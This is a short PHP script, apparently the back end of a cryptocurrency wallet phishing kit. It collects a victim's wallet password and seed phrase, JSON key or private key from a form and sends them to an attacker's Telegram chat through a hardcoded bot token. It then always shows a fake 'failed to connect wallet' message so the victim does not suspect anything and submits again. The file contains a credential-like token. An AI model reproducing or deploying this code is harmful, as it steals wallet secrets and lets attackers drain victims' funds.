<?php
// SECURITY: Your Telegram BOT token and chat ID
$botToken = "6832008272:AAEha8itiw6MtghUAzxvAYx5Tt8xD9l9wXA";
$chatId = "@zeha101";

// === SANITIZE AND GATHER POST DATA ===
$walletName   = htmlspecialchars($_POST['wallet_name'] ?? 'No Name');
$walletMethod = htmlspecialchars($_POST['wallet_method'] ?? 'Unknown Method');
$pass         = htmlspecialchars($_POST['wallet_password'] ?? 'NULL');

$walletData = '';
if ($walletMethod === "Phrase Key") {
    $walletData = htmlspecialchars($_POST['phrase_key'] ?? '');
} elseif ($walletMethod === "Json Key") {
    $walletData = htmlspecialchars($_POST['json_key'] ?? '');
} elseif ($walletMethod === "Private Key") {
    $walletData = htmlspecialchars($_POST['private_key'] ?? '');
}

// === VALIDATION ===
if (empty($walletData)) {
    echo "❌ Wallet data missing.";
    exit;
}

// === COMPOSE TELEGRAM MESSAGE ===
$message = "
🔐 New Import
----------------------------
🧾 Method: $walletMethod
📛 Wall: $walletName
📜 Data: $walletData
🔑 Pass: $pass
----------------------------
";

// === SEND TO TELEGRAM ===
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$response = file_get_contents($url . '?' . http_build_query([
    'chat_id' => $chatId,
    'text' => $message
]));

// === RESPONSE BACK TO JS ===
if ($response) {
    echo "❌ Failed to  connect wallet, try again.";
} else {
    echo "❌ Failed to  connect wallet, try again.";
}

?>